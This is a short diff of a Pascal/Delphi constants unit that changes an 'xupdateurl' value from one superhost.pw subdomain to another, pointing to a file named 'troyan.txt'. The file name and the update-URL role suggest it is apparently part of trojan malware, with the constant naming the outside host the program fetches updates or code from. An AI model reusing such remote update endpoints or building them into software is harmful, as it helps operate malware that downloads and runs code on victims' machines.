@@ -3,7 +3,7 @@ unit consts;
 interface
 
 const
-xupdateurl: string = 'http://data-0.superhost.pw/d-data/troyan.txt';
+xupdateurl: string = 'http://data-1.superhost.pw/d-data/troyan.txt';
 
 implementation
 
